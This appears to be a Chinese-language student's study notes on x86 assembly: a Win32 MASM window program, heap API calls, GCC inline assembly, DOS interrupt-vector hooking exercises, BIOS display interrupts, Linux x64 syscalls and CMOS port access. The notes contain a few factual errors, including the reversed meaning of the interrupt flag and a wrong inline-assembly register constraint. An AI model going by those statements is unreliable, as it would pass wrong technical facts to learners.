数据段;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data?hInstance\tdd ?hWinMain\tdd ? .constszClassName\tdb\t&#x27;MyClass&#x27;,0szCaptionMain\tdb\t&#x27;My first Window !&#x27;,0szText db\t&#x27;Win32 Assembly, Simple and powerful !&#x27;,0szCaption1\tdb\t&#x27;A MessageBox !&#x27;,0szText1 db\t&#x27;Hello, World !&#x27;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 代码段;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;; 窗口过程;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;;程序的另一半_ProcWinMain\tproc\tuses ebx edi esi hWnd,uMsg,wParam,lParam local\t@stPs:PAINTSTRUCT local\t@stRect:RECT local\t@hDc mov\teax,uMsg;******************************************************************** .if\teax ==\tWM_PAINT invoke\tBeginPaint,hWnd,addr @stPs mov\t@hDc,eax invoke\tGetClientRect,hWnd,addr @stRect invoke\tDrawText,@hDc,addr szText,-1,\\ addr @stRect,\\ DT_SINGLELINE or DT_CENTER or DT_VCENTER invoke\tEndPaint,hWnd,addr @stPs;******************************************************************** .elseif\teax ==\tWM_CLOSE invoke\tDestroyWindow,hWinMain invoke\tPostQuitMessage,NULL;******************************************************************** .else invoke\tDefWindowProc,hWnd,uMsg,wParam,lParam ret .endif;******************************************************************** xor\teax,eax ret_ProcWinMain\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_WinMain\tproc ;这个窗口的&quot;WNDCLASSEX&quot;结构体类型是已经被定义好的,现在在局部变量定义就好了 ;这里还有一个MSG类型,wok!! local\t@stWndClass:WNDCLASSEX local\t@stMsg:MSG ;API-1 invoke\tGetModuleHandle,NULL mov\thInstance,eax ;API-2 invoke\tRtlZeroMemory,addr @stWndClass,sizeof @stWndClass;********************************************************************; 注册窗口类;******************************************************************** ;LoadCursor指定鼠标在窗口光标的形状,这里的IDC_AERROW是预定义的 invoke\tLoadCursor,0,IDC_ARROW ;初始化窗口类Class的成员 mov\t@stWndClass.hCursor, eax push\thInstance pop\t@stWndClass.hInstance mov\t@stWndClass.cbSize, sizeof WNDCLASSEX mov\t@stWndClass.style, CS_HREDRAW or CS_VREDRAW mov\t@stWndClass.lpfnWndProc,\toffset _ProcWinMain mov\t@stWndClass.hbrBackground,\tCOLOR_WINDOW + 1 mov\t@stWndClass.lpszClassName,\toffset szClassName invoke\tRegisterClassEx, addr @stWndClass;********************************************************************; 建立并显示窗口;******************************************************************** ;上面的初始化是一些class共性的初始化,而DIY的初始化在这里 invoke\tCreateWindowEx,WS_EX_OVERLAPPEDWINDOW,offset szClassName,offset szCaptionMain,\\ WS_OVERLAPPEDWINDOW,\\ 100,100,600,400,\\ NULL,NULL,hInstance,NULL mov\thWinMain,eax ;eax传回来了窗口的句柄,用来备用 invoke\tShowWindow,hWinMain,SW_SHOWNORMAL ;SHowWindos只会显示窗口,不会显示u内容 invoke\tUpdateWindow,hWinMain ;Update才会先睡文本;********************************************************************; 消息循环;******************************************************************** .while TRUE invoke PeekMessage,addr @stMsg,NULL,0,0,PM_REMOVE .if\teax .break .if @stMsg.message==WM_QUIT invoke TranslateMessage,addr @stMsg invoke\tDispatchMessage,addr @stMsg .else pushad invoke\tMessageBox,NULL,offset szText1,offset szCaption1,MB_OK popad .endif .endw ret_WinMain\tendp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;start: call\t_WinMain invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart 不理解为什么他会进入那3个函数 1234.if\teax\t.break .if @stMsg.message==WM_QUIT\tinvoke TranslateMessage,addr @stMsg\tinvoke\tDispatchMessage,addr @stMsg 或者为什么进入 1234.else\tpushad\tinvoke\tMessageBox,NULL,offset szText1,offset szCaption1,MB_OK\tpopad 是什么东西在影响你的消息队列 窗口过程1My_ProcWinMain\tproc\thWnd,uMsg,wParam,lParam hWnd:窗口回调要指明的操作窗口 uMsg:… 1My_ProcWinMain\tproc\tuses ebx edi esi hWnd,uMsg,wParam,lParam 关于那几个参数的入栈 uses ebx edi esi 为什么入栈?因为他们会被偷偷的改变,就像MessageBox修改ecx,eax..那样,他会对后面的判断做一些影响 uMsg参数有一定的范围,其他的不多说..这里会用到SendMesage参数来传递自定义的参数 ….详情就在看书 wParam&#x2F;IParam参数是消息附带的,他们的职能会根据不同的调用而不同,详情见书 处理了不同的消息必须返回规定的值给windows,对于不同的过程会有不同的返回值 好比程序无法完成初始化就会返回-1 WM_CLOSE消息是按下窗口的叉叉按钮,主要负责释放内存,保存工作,提示用户是否需要保持 …. …上面很杂很多很难理解..主要是缺乏应用,对那些结构体的认识不够到位 …后面回来慢慢看 收到消息的顺序收到消息不一定是从循环开始,而是在CreateWindow中开始了 显示和刷新窗口的函数ShowWindow和UpdateWindow 也向窗口过程发送信息 窗口间的通信动态内存分配动态内存分配 (dynamic memory allocation)，又被称为堆分配 (heap allocation)， 汇编语言程序有两种方法进行动态分配： 方法一：通过系统调用从操作系统获得内存块。 方法二：实现自己的堆管理器来服务更小的对象提出的请求。 函数一览表利用下表中的几个 Win32 API .表中所有的函数都会覆盖通用寄存器，因此程序实现重要寄存器的入栈和出栈操作。 函数 描述 GetProcessHeap 用 EAX 返回程序现存堆区域的 32 位整数句柄。如果函数成功，则 EAX 中的返回值为堆句柄。 如果函数失败，则 EAX 中的返回值为 NULL HeapAlloc 从堆中分配内存块。如果成功，EAX 中的返回值就为内存块的地址。如果失败，则 EAX 中的返 回值为 NULL HeapCreate 创建新堆，并使其对调用程序可用。如果函数成功，则 EAX 中的返回值为新创建堆的句柄。如果失败，则 EAX 的返回值为 NULL HeapDestroy 销毁指定堆对象，并使其句柄无效。如果函数成功，则 EAX 中的返回值为非零 HeapFree 释放之前从堆中分配的内存块，该堆由其地址和堆句柄进行标识。如果内存块释放成功，则返回值为非零 HeapReAlloc 对堆中内存块进行再分配和调整大小。如果函数成功，则返回值为指向再分配内存块的指针。如果函数失败，且没有指定 HEAP GENERATE EXCEPTIONS，则返回值为 NULL HeapSize 返回之前通过调用 HeapAlloc 或 HeapReAlloc 分配的内存块的大小。如果函数成功，则 EAX 包含被分配内存块的字节数。如果函数失败，则返回值为 SIZE_T-1 ( SIZE_T 等于指针能指向的最大字节数 ) GetProcessHeap 返回已用堆区的地址没有参数 如果使用的是当前程序的默认堆，那么 GetProcessHeap 就足够了。这个函数没有参数，EAX 中的返回值就是堆句柄： 1GetProcessHeap PROTO 例子 123456789.datahHeap HANDLE ?.codeINVOKE GetProcessHeap.IF eax == NULL ;不能获取句柄 jmp quit.ELSE mov hHeap,eax ;句柄 ok.ENDIF HeapCreate 创建堆区为当前程序创建一个新的私有堆： 1234HeapCreate PROTO, flOptions:DWORD, ;堆分配选项 dwInitialSize:DWORD, ;按字节初始化堆大小 dwMaximumSize:DWORD ;最大堆字节数 flOptions 设置为 NULL。 dwInitialSize 设置为初始堆字节数，其值的上限为下一页的边界。 如果 HeapAlloc 的调用超过了初始堆大小，那么堆最大可以扩展到 dwMaximumSize 参数中指定的大小（上限为下一页的边界）。 调用后，EAX 中的返回值为空就表示堆未创建成 功。HeapCreate 的调用示例如下 1234567891011HEAP_START = 2000000 ; 2 MBHEAP_MAX = 400000000 ; 400 MB.datahHeap HANDLE ? ; 堆句柄.codeINVOKE HeapCreate, 0, HEAP_START, HEAP_MAX.IF eax == NULL ; 堆未创建 call WriteWindowsMsg ; 显示错误消息 jmp quit.ELSE mov hHeap,eax ; 句柄 OK.ENDIF HeapDeatroy 销毁堆区销毁一个已存在的私有堆（由 HeapCreate 创建）。需向其传递堆句柄 12HeapDestroy PROTO, hHeap:DWORD ;堆句柄 如果堆销毁失败，则 EAX 等于 NULL。下面为示例调用，其中使用了 WriteWindowsMsg 过程 1234567.datahHeap HANDLE ? ;堆句柄.codeINVOKE HeapDestroy, hHeap.IF eax == NULL call WriteWindowsMsg ;显示错误消息.ENDIF HeapAlloc 堆区中分配内存块从已存在堆中分配一个内存块： 为什么还要分配!!!!!!!!!!!!!!!!! 1234HeapAlloc PROTO, hHeap:HANDLE, ;现有堆内存块的句柄 dwFlags :DWORD, ;堆分配控制标志 dwBytes:DWORD ;分配的字节数 需传递下述参数： hHeap：32 位堆句柄，该堆由 GetProcessHeap 或 HeapCreate 初始化。 dwFlags：一个双字，包含了一个或多个标志值。可以选择将其设置为 HEAP_ZERO_MEMORY，即设置内存块为全零。 dwBytes：一个双字，表示堆分配的字节数。 如果 HeapAlloc 成功，则 EAX 包含指向新存储区的指针； 如果失败，则 EAX 中的返回值为 NULL。 下面的代码用 hHeap 标识一个堆，从该堆中分配了一个 1000 字节的数组，并将数组初始化为全零： 1234567891011.datahHeap HANDLE ? ;堆句柄pArray DWORD ? ;数组指针.codeINVOKE HeapAlloc, hHeap, HEAP_ZERO_MEMORY, 1000.IF eax == NULL mWrite &quot;HeapAlloc failed&quot; jmp quit.ELSE mov pArray,eax.ENDI HeapFree 释放在堆区分配的内存块函数 HeapFree 释放之前从堆中分配的一个内存块，该堆由其地址和堆句柄标识： 1234HeapFree PROTO, hHeap:HANDLE, dwFlags:DWORD, lpMem:DWORD 第一个参数是包含该内存块的堆的句柄。 第二个参数通常为零， 第三个参数是指向将被释放内存块的指针。 如果内存块释放成功，则返回值非零。非0是多少????? 如果该块不能被释放，则函数返回零。 例子 1INVOKE HeapFree, hHeap, 0, pArray Error Handling若在调用 HeapCreate、HeapDestroy 或 GetProcessHeap 时遇到错误，可以通过调用 API 函数 GetLastError 来获得详细信息。 内嵌汇编__asm 源于vs-2010提示：在“asm”的前面有两个下划线。 编写内嵌汇编代码时允许： 使用 x86 指令集内的大多数指令。 使用寄存器名作为操作数。 通过名字引用函数参数。 引用在 asm 块之外定义的代码标号和变量。（这点很重要，因为局部函数变量必须在 asm 块的外面定义。） 使用包含在汇编风格或 C 风格基数表示法中的数字常数。比如，0A26h 和 0xA26 是等价的，且都能使用。 在语句中使用 PTR 运算符，比如 inc BYTE PTR[esi]。 使用 EVEN 和 ALIGN 伪指令。 限制 编写内嵌汇编代码时不允许： 使用数据定义伪指令，如 DB（BYTE）和 DW（WORD）。 使用汇编运算符（除了 PTR 之外）。 使用 STRUCT、RECORD, WIDTH 和 MASK。 使用宏伪指令，包括 MACRO、REPT、IRC、IRP 和 ENDM，以及宏运算符（&lt;&gt;、!、&amp;、% 和 .TYPE）。 通过名字引用段。（但是，可以用段寄存器名作为操作数。） 对于printf输出字符串,还是要传入字符串的地址,用addr,不能用数组名.woc 还有就是%d的操作对象是32位的数据 _asm _ 源于linux系统的nasm每一行有不同的情况结束 基本内联1️⃣ __ asm __(); 2️⃣ 汇编里面每一句都用&quot;&quot;括起来 最后一句不用分号 123&quot;mov rax,x;&quot;\t//形式1&quot;mov rax,a &quot; //形式2&quot;mov prod,rax&quot; //最后一句 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;int x=11,y=12,sum,prod;int subtract(void);void multiply(void);int main(void)&#123;\tprintf(&quot;The numbers are %d and %d &quot;,x,y);\t__asm__\t( &quot;.intel_syntax noprefix;&quot; &quot;mov rax,x;&quot; &quot;add rax,y;&quot; &quot;mov sum,rax&quot;\t); printf(&quot;The sum is %d. &quot;,sum);\tprintf(&quot;The difference is %d. &quot;,subtract());\tmultiply();\tprintf(&quot;The product is %d. &quot;,prod); &#125;int subtract(void)&#123;\t__asm__\t( &quot;.intel_syntax noprefix;&quot; &quot;mov rax,x;&quot; &quot;sub rax,y&quot; // return value in rax\t);&#125;void multiply(void)&#123;\t__asm__\t( &quot;.intel_syntax noprefix;&quot; &quot;mov rax,x;&quot; &quot;imul rax,y;&quot; &quot;mov prod,rax&quot; //no return value, result in prod\t);&#125; 扩展内联1️⃣.寄存器约束 12:&quot;=a&quot;(esum):&quot;d&quot;(x), &quot;c&quot;(y) a-&gt;rax.eax.ax.al b-&gt;rbx.ebx.bx.bl c-&gt;rcx.ecx.cx.cl d-&gt;rdx.edx.dx.dl s-&gt;rsi.esi.si d-&gt;rdi.edi.di r-&gt;任意寄存器 2️⃣. 可选项以:开头 1234:&quot;=a&quot;(eproduct):&quot;d&quot;(x), &quot;c&quot;(y):&quot;rbx&quot;//这里的rdx会被认为是被破坏的,将恢复原始值,但它不会引起崩溃 3️⃣. 12:&quot;=a&quot;(esum):&quot;d&quot;(x), &quot;c&quot;(y) 表示输出是rax,rax引用变量esum 输入是rdx,rcx,分别引用x,y 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// inline2.c#include &lt;stdio.h&gt;\tint a=12;\t// global variables\tint b=13;\tint bsum;int main(void)&#123;printf(&quot;The global variables are %d and %d &quot;,a,b);__asm__(\t&quot;.intel_syntax noprefix &quot;\t&quot;mov rax,a &quot;\t&quot;add rax,b &quot;\t&quot;mov bsum,rax &quot;\t:::&quot;rax&quot;\t); printf(&quot;The extended inline sum of global variables is %d. &quot;, bsum);int x=14,y=16, esum, eproduct, edif; // local variablesprintf(&quot;The local variables are %d and %d &quot;,x,y);__asm__( &quot;.intel_syntax noprefix;&quot;\t&quot;mov rax,rdx;&quot;\t&quot;add rax,rcx;&quot;\t:&quot;=a&quot;(esum)\t:&quot;d&quot;(x), &quot;c&quot;(y)\t); printf(&quot;The extended inline sum is %d. &quot;, esum);__asm__(\t&quot;.intel_syntax noprefix;&quot;\t&quot;mov rbx,rdx;&quot;\t&quot;imul rbx,rcx;&quot;\t&quot;mov rax,rbx;&quot;\t:&quot;=a&quot;(eproduct)\t:&quot;d&quot;(x), &quot;c&quot;(y)\t:&quot;rbx&quot;\t); printf(&quot;The extended inline product is %d. &quot;, eproduct);__asm__(\t&quot;.intel_syntax noprefix;&quot;\t&quot;mov rax,rdx;&quot;\t&quot;sub rax,rcx;&quot;\t:&quot;=a&quot;(edif)\t:&quot;d&quot;(x), &quot;c&quot;(y)\t); printf(&quot;The extended inline asm difference is %d. &quot;, edif);&#125; 中断程序8086①. 内中断就是CPU立刻需要一个程序去处理的中途发生的异常,好像类似于C++异常 什么是内中断?就是程序运行后,你不去物理的碰它,它发生的中断 关于这本书讲的中断安装….什么意思?????? 也就是说当你打开你的DOS-BOX,然后你运行了你的中断代码.你的程序就修改了系统的一下配置, 但你再运行你的DOS-BOX,前提是你没有关闭,你就可以再次运行,你的系统默认中断就已经被修改了 好比这个安装 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273assume cs:code,ss:stackstack segment db 32 dup(&#x27;S&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,32 push cs pop ds mov si,offset int9 mov ax,0 mov es,ax mov di,204h mov cx,offset int9_end - offset int9 cld rep movsb push es:[9*4+0] pop es:[200h+0] push es:[9*4+2] pop es:[200h+2] cli mov word ptr es:[9*4+0],204h mov word ptr es:[9*4+2],0 sti mov ax,4c00h int 21h int9: push ax push bx push cx push es in al,60h pushf call dword ptr cs:[200h];调用int 9的中断 cmp al,48h;F1--&gt;3bh jne int9ret mov ax,0b800h mov es,ax mov bx,1 mov cx,2000 s: inc byte ptr es:[bx] add bx,2 loop s int9ret: pop es pop cx pop bx pop ax iret int9_end: nopcode endsend start 当执行了这个代码后,你按一下↑就可以修改屏幕的颜色 关于写中断要注意什么???? 你的中断不能影响原来寄存器的的状态…好比通用寄存器,标志寄存器..不是不可以动,,,只是不要动main的程序 简要介绍好比这样一个位置,中断向量表开始位置0000:0000 0000:4*0x7C 上面这个地址表示的是index&#x3D;0x7C的中断类型码 在位置0000:4*0x7C下 [0000:4*0x7C+0]&#x3D;某个中断例程的IP, 比如IP&#x3D;0x200 [0000:4*0x7C+2]&#x3D;某个中断例程的CS,比如CS&#x3D;0000 于是你调用中断 int 7ch 那么系统去0000:0000找到7ch 然后按去往IP&#x3D;[0000:4 * 0x7C+0],CS&#x3D;[0000:4 * 0x7C+2]的地址处执行中断例程 中断的过程的入栈调用int index就会push 所有的寄存器,然后push cs,push ip 最后的出栈..它会调用iret把上面的东西都pop 出去 调用了int,如果你想退出程序,就在初始化int函数时,写上下面的代码 这个代码什么意思? 12mov ax,4c00hint 21h 调用int 21h中断,在调用前,初始化指向子函数ah=4c,然后配置al=0 push 寄存器??? 标志寄存器有假设10个? 其中8个他们的状态是11001010,于是我们把它看作一个8位的数据,可以达到11001010b&#x3D;0xCA,于是我们就把0xCA入栈 然后我们再push IF,TF,他们与外中断的屏蔽有关,,调用内中断时,会让IF=0,屏蔽了可屏蔽的外中断 于是我们才会用入栈6字节的数据,4字节是CS:IP,2字节是8个寄存器值和2个寄存器值 如何DIY一个中断把它封装为一个函数 12call init_do0//然后去写中断函数,安装中断函数 书写中断函数 调用复制功能的函数 1234567891011121314//调用代码复制函数,因为你无法直接向中断向量的地址处写入数据,只能复制过去初始化DS:[SI]初始化ES:[di]初始化CX//涉及到了offset的取地址//这里是依据把中断函数写好了然后去复制执行 cldrep movsb然后初始化一下中断向量表指向那个地址 mov ax,0 mov es,ax mov word ptr es:[0*4+0],200h mov word ptr es:[0*4+2],0 这个代码的意思就是 初始化0号中断,让0号中断执行中断例程的地址0000:0200 代码一 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697assume cs:code , ss:stackstack segment db 128 dup(&#x27;y&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax; mov sp,128 call init_do0;他只会push ip mov ax,1000h mov bh,1 div bh mov ax,4c00h int 21h;----------------------------------------------------------------------------------------------------------------- init_do0: ;先是修改数据的指向,然后是复制中断代码到中断区,中断区域的调用是自动的 ;-------------------------------------------- ;设置数据来源 S指-&gt;CS:[do0] mov ax,cs mov ds,ax mov si,offset do0;这样取地址就非常的妙..不想你之前根本想不到 ;设置数据D-&gt;0000:[0200] mov ax,0 mov es,ax mov di,200h mov cx,offset do0end - offset do0;循环的次数 cld rep movsb ;数据指向完成后,初始化一下中断向量表,第[0]个向量表的地址0000:0200 mov ax,0 mov es,ax mov word ptr es:[0*4+0],200h mov word ptr es:[0*4+2],0 ret ;-------------------------------------- do0: jmp short do0start db &quot;over flow&quot; do0start: mov ax,cs; mov ds,ax mov si,202h;这里的si可能是在指向字符串的偏移地址,jmp占据2个字节,然后他后面的就是字符串数据 ;y要显示的字符串 mov ax,0b800h mov es,ax mov cx,2000 mov dx,0700h mov bx,0 clean_screen: mov es:[bx],dx add bx,2 loop clean_screen mov di,12*160+36*2 mov cx,9;字符串的长度 S: mov al,ds:[si] mov ah,2 mov es:[di],ax inc si add di,2 loop S iret;他会pop ip,所以他就是类似于一个ret do0end: nopcode endsend start 怎么调用一个中断 程序崩溃时调用 人为的直接int index 调用 我自己写的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081assume cs:code , ss:stackstack segment db 32 dup(&#x27;0&#x27;)stack endscode segmentstart: ;栈的初始化,容易忘记出初始化sp mov ax,stack mov ss,ax mov sp,32 ;初始化内中断实例 call init_do7ch ;向显存写东西 mov ax,0b800h mov es,ax mov di,160*20+30 ;初始化一些吸入什么东西 mov ah,2 mov al,&#x27;!&#x27; ;打印的个数 mov cx,4 ;安全的让bp=0 mov bp,0 ;待会ip要回走,所以需要一个地址的间隔 mov bx,offset s0end -offset s0 s0: ;开始写入显存 mov es:[di],ax ;遍历 add di,2 ;调用 int 7ch s0end: ;标志一下位置 nop mov ax,4c00h int 21h init_do7ch: ;source mov ax,cs mov ds,ax mov si,offset do7ch ;destaion mov ax,0 mov es,ax mov di,200h ;复制多少字节 mov cx,offset do7chend - offset do7ch cld rep movsb ;初始化向量表 mov word ptr es:[7ch*4+0],200h mov word ptr es:[7ch*4+2],0 ret do7ch: ;判断是否结束 dec cx jcxz lpret ;保存一下bp,因为bp=sp,在发生变化 push bp mov bp,sp sub ss:[bp+2],bx;让栈了里里面的ip重新指向开始的地方 pop bp lpret: iret do7chend:nopcode endsend start int 10h-&gt;ah&#x3D;2 光标中断int 10h-&gt;ah&#x3D;2置光标 bh-&gt;第几页 dh-&gt;第几行 dl-&gt;第几列 123456mov ah,2; int 10h的子程序mov bh,0\t;bh是di某页mov dh,5\t;行号mov dl,12\t;列号int 10h\t;10h中断例程 80x25的字符模式下 0~24共25行 0~79共80列 0~7共8页 在80x25的模式下,B800~BFFF有32kb默认显示第0页 int 10h-&gt;ah&#x3D;9 显示一个字符int 10h-&gt;ah&#x3D;9,在光标处显示字符 al-&gt;显示的字符 bl-&gt;颜色 bh-&gt;第几页 cx-&gt;重复显示的个数,往后挪 1234567mov ah,9;调用子函数mov al,&#x27;?&#x27;;显示字符&#x27;?&#x27;mov bl,7;颜色的属性mov bh,0;第0页mov cx,3;字符重复的个数int 10h;调用中断 int 21h-&gt;ah&#x3D;9 输出以‘$’结尾的字符串ds-&gt;数据来源的短地址 dx-&gt;数据来源的偏移地址 ah-&gt;9功能编号,输出字符串,遇到$结束 int 21h 12345mov ax,datamov ds,axmov dx,0mov ah,9in 21h ②. 外中断简述外中断-&gt;1.可以被屏蔽\t2.不可以屏蔽(其中断类型码只能是2) 之前内中断我们初始化了IF 对于可屏蔽的中断, IF=1,表示屏蔽中断,IF=0,表示不屏蔽中断 指令 12sti,置IF=1cli 置IF=0 PC机I&#x2F;O键盘处理过程键盘主板寄存器的端口是60h 按下一个键,芯片产生一个扫描码,叫通码 松开一个键,芯片也会产生一个扫描码,叫断码 断码&#x3D;通码+80h 80h&#x3D;&#x3D;1000 0000b 可见最开头那位是一个开关之类的东西 int 9只是对你的键入做了一个判断与执行..至于你的键入后怎么操作..这就得看你怎么对int 9去DIY的配置 我还是不太明白int9到底有个啥用!!!!!!!!!!!!!!!! ​ int 9中断 打印ascii的abcef键盘的输入达到60h端口时,芯片就会自动的向CPU发出int 9的中码断,如果CPU检测到IF=1则表示接受外界键入,然后去指向int 9中断过程如果IF=0,表述拒绝接受键入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111assume cs:code,ds:data,ss:stackstack segment db 32 dup(&#x27;S&#x27;)stack endsdata segment db 128 dup(&#x27;D&#x27;)data endscode segmentstart: mov ax,data mov ds,ax mov ax,stack mov ss,ax mov sp,32 mov ax,0b800h mov es,ax call init_9h;专门成立一个函数去初始会化int9,而且更大程度的保障了寄存器不发生更多的变化 ;=========================================================== mov cx,0 ;从感叹号开始显示 mov cl,&#x27;!&#x27; ;颜色从2开始 mov ch,2 ;开始的地点是10行20列 mov di,160*10+20 show: ;把配置输入到显存 mov es:[di],cx ;加缓延时 call delay;delay函数不能与cmp与jne交叉,以为delay内部会有指令修改寄存器的操作 ;指向下一个像素 add di,2 ;指向下一个字符 inc cl ;重点是&#x27;~&#x27; cmp cl,&#x27;~&#x27; jna show ;备份int9的原始向量 mov ax,0 mov es,ax ;原始向量恢复到向量表,,,否者DOS系统运行完毕后键盘将屏蔽你的外中断 push ds:[0] pop es:[9*4+0] push ds:[2] pop es:[9*4+2] mov ax,4c00h int 21h ;============================================================ delay: ;它的原理我不太懂 mov ax,0 mov bx,1h delay_continue: sub ax,1;它是控制速度的 sbb bx,0 cmp ax,0 jne delay_continue cmp bx,0 jne delay_continue ret ;============================================================ init_9h: push es mov ax,0 mov es,ax ;备份int 9的中断向量表 push es:[9*4+0] pop ds:[0] push es:[9*4+2] pop ds:[2] cli mov word ptr es:[9*4+0],offset start_9h mov es:[9*4+2],cs sti pop es ret start_9h: ;你键入的数据在端口60处 in al,60h;al从端口接收了你的键入 ;模拟int9的过程,push全部寄存器,然后push cs,IP pushf call dword ptr ds:[0];int9自己有iret cmp al,48h;48h是 ↑ jne start_9h_end;如果不是上就跳过然后结束,如果这里用je会比较麻烦!!!!!!!!!!!!!!!! inc ch start_9h_end: iret ;========================================================================= code endsend start x64printf_syscall12345mov rax,1mov rdi,1mov rsi,str1mov rdx,len1syscall rax的1代表了写入 rdi的1代表了标准输出 rsi代表了字符串输出的地址 rdx代表了输出的长度,最后的0不计数 syscall调用系统内部的和中断 这些寄存器可否用于其他的用途 于是你封装函数的时候,就传递一些动态参数,初始化一些固定的参数 scanf_syscallrax&#x3D;0,表示读取 rdi&#x3D;1,表示标准输入 rsi&#x3D;输入字符串的地址 rdx&#x3D;输入字符串的长度 它没有格式化输入与输出 你的rsi是字符串,你就只能输入字符串??? 你的rsi指向dd.你就只能输入数值?? ret_syscall下面的代码等效于main函数的return,好比ret 123mov rax, 60 ; 60 = exitmov rdi, 0 ; 0 = success exit codesyscall ; quit 端口类比一下中断程序 因为书上没有怎么介绍..依次我就没有多多的解释 (一). 读写指令从右-&gt;左看 12(读) in 寄存器/数据, 端口 //端口S的数据读进D寄存器(写) out 端口, 寄存器/数据 //把S的数据写进 读从端口读入到接收者 端口是一个编号,也可以是装有编号的寄存器 写入的数据是8位就只能用AL 如果是16位就用AX 写把数据写入端口 端口是一个编号,也可以是装有编号的寄存器 写入的数据是8位就只能用AL (二). CMOS RAM 芯片端口简要介绍该芯片内部有2个端口, 端口地址 可以是70h,代表了地址写入的端口 可以是71h,代表了数据读取&#x2F;写入的端口 如何读取CMOS RAM的2号单元 ①. 把2号写入71h out 70h,2 ②. 71h数据读入 in ax,71h 检测点 12345678910111213141516171819202122232425262728293031assume cs:code,ss:stackdata segment db &#x27;i really love love you&#x27;,&#x27;$&#x27;data endsstack segment db 128 dup(&#x27;y&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,128 mov ax,0 mov al,2 out 70h,al mov ax,0 in al,71h mov ax,4c00h int 21hcode endsend start CMOS下的时间单元什么叫BCD码4位的二进制就构成一个BCD码 好比10进制的26就是由0010和0110构成 0010代表2 0110代表6 时间单元 年 月 日 时 分 秒 9 8 7 4 2 0 